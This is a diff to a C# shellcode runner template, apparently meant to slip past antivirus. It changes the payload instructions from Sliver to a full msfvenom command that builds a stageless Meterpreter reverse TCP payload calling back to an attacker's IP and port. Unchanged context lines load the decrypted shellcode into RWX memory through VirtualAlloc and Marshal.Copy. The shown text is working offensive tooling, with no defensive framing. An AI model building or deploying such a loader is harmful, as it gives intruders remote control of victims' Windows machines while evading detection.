@@ -1,8 +1,8 @@
 // =============================================================================
 // TEMPLATE — replace buf with your encrypted shellcode before compiling
 //
-// Generate and encrypt shellcode (Sliver):
-//   1. sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+// Generate and encrypt shellcode (msfvenom):
+//   1. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //   2. Paste bytes into aes-shellcode-encryption.cs and run it
 //   3. Copy the output buf here and update the byte count
 // =============================================================================
@@ -44,7 +44,7 @@ namespace AV_Ceasar_Runner
 
             int size = decryptedShellcode.Length;
 
-            // Allocate exactly the decrypted shellcode size (Sliver shellcode is MBs — a fixed 0x1000 would fail)
+            // Allocate exactly the decrypted shellcode size (stageless Meterpreter is ~200KB — a fixed 0x1000 would fail)
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
 
             Marshal.Copy(decryptedShellcode, 0, addr, size);
